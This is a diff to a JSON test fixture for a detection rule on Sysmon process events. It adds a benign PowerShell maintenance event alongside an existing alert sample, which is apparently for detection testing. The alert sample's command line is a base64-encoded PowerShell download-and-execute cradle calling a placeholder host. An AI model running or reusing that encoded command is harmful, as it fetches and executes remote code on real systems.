@@ -16,5 +16,20 @@
         "commandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AdABlAHMAdAAnACkA"
       }
     }
-  }
+  },
+  "benign_event": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "severityValue": "INFORMATION",
+        "eventID": 1
+      },
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\ProgramData\\Automation\\collect_metrics.ps1"
+      }
+    }
+  },
+  "benign_rationale": "Standard automated maintenance scripts running plaintext PowerShell should not trigger encoded-command alerts."
 }
